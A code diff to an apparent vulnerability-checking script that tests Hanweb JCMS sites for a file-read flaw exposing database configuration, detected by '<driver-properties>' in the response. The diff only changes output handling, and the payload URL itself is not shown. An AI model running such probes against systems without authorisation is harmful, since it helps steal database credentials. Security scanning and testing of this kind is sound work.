@@ -10,8 +10,8 @@ description: 大汉JCMS内容管理系统由于对文件读取时没有对文件
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class hanweb_readxml_fileread_BaseVerify():
     def __init__(self, url):
@@ -27,12 +27,12 @@ class hanweb_readxml_fileread_BaseVerify():
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
 
             if r"<driver-properties>" in req.text:
-                cprint("[+]存在大汉版通JCMS数据库读取漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在大汉版通JCMS数据库读取漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = hanweb_readxml_fileread_BaseVerify(sys.argv[1])
     testVuln.run()
